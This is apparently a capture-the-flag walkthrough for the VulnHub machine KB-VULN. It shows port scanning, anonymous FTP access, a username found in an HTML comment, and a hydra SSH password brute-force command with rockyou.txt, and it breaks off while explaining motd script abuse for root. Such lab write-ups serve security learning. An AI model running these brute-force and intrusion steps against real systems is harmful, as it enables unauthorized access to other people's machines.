You can find the machine there > [KB-VULN](https://www.vulnhub.com/entry/kb-vuln-1,540/){:target="_blank"}

## Summary

This machine is an easy one, from source code enumeration we can detect a username and ssh brute force with it. After gaining a low-privilege shell we can exploit motd daemon and change root password. Let's pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.20
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 00:11 EEST

```

Let's start the enumeration on port 21 since we have to anonymous allowed, we can see a `.bash_history` file let's download it.

```
$ ftp $ip
Connected to 192.168.1.20.
220 (vsFTPd 3.0.3)

local: .bash_history remote: .bash_history
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .bash_history (54 bytes).

```

At the time is useless, maybe we can use it later.

```
$ cat .bash_history 
exit
ls
cd /etc/update-motd.d/
ls
nano 00-header
exit
```

## Shell as sysadmin

Let's move on, port 80 source code gives us a username probably system one because i can't find a way to use it on web.

```html
$ curl http://$ip/
<!DOCTYPE html>
<html lang="en">
<head>
<title>OneSchool &mdash; Website by Colorlib</title>
<meta charset="utf-8">

...data...

<!-- Username : sysadmin -->
```

Let's try to ssh brute force with it, using rockyou.txt. & here we go!

```
$ hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt $ip ssh

```
$ ssh sysadmin@$ip
sysadmin@192.168.1.20's password: 

sysadmin@kb-server:~$ whoami;id

```

## Shell as root

Before we found something interesting from FTP, the `/etc/update-motd.d/` & `00-header`. Motd(Message Of The Day daemon) is the welcome message that show to a user upon the terminal login. Modifying the /etc/motd file you can change the welcome message. But for better configuration you can use the scripts located in the `/etc/update-motd.d` directory.
